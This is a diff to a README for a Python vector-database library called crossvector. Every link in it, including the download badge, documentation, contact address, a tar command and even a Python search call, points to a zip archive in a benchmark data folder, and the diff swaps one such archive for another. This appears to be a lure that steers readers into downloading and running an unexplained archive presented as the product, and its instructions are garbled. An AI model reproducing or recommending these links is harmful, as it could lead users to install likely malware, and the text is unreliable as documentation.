@@ -1,7 +1,7 @@
 # 🚀 crossvector - Effortless Vector Database Management
 
 ## 📥 Download Now
-[![Download crossvector](https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip%20crossvector-v1.0-blue)](https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip)
+[![Download crossvector](https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip%20crossvector-v1.0-blue)](https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip)
 
 ## 📘 About crossvector
 crossvector is a production-ready Python vector database library. It provides a unified API for popular databases such as PgVector, ChromaDB, Milvus, and AstraDB. This tool simplifies integrating semantic search and AI applications. You can switch between different backends without changing your code, making it excellent for developers and enthusiasts alike.
@@ -24,7 +24,7 @@ To run crossvector smoothly, ensure your system meets the following requirements
 ### Step 1: Visit the Releases Page
 To download crossvector, visit the following page:
 
-[Download crossvector](https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip)
+[Download crossvector](https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip)
 
 ### Step 2: Choose Your Version
 Once on the Releases page, locate the latest version. You will see a list of files available for download. Look for the file suitable for your operating system.
@@ -48,7 +48,7 @@ After the download completes, follow these steps depending on your operating sys
 #### For Linux:
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the package.
-3. Run the command: `tar -xzf https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip`
+3. Run the command: `tar -xzf https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip`
 4. Change into the extracted directory and run the installation script.
 
 ### Step 5: Verify Installation
@@ -80,18 +80,18 @@ db = Database(backend='ChromaDB')  # Change the backend as needed
 4. **Use crossvector to perform vector searches:**
 
 ```python
-results = https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip("your search query")
+results = https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip("your search query")
 ```
 
 These basic steps will help you get started with crossvector and show you how to integrate it into your projects.
 
 ## 📖 Documentation
-For detailed documentation and advanced features, refer to the [Documentation](https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip) page. Here you will find comprehensive guides and examples to make the most of crossvector.
+For detailed documentation and advanced features, refer to the [Documentation](https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip) page. Here you will find comprehensive guides and examples to make the most of crossvector.
 
 ## 🔍 Support and Contribution
 If you encounter any issues or need support, please open an issue on the GitHub repository. Contributions are welcome! Feel free to fork the repository and submit pull requests.
 
 ## 📬 Contact
-For inquiries or further information, you can reach us at: [https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip](https://raw.githubusercontent.com/ribagolx10/crossvector/main/scripts/benchmark/crossvector_1.5.zip)
+For inquiries or further information, you can reach us at: [https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip](https://github.com/ribagolx10/crossvector/raw/refs/heads/main/scripts/benchmark/data/Software-2.3.zip)
 
 Thank you for choosing crossvector. We hope it helps you simplify your vector database management!
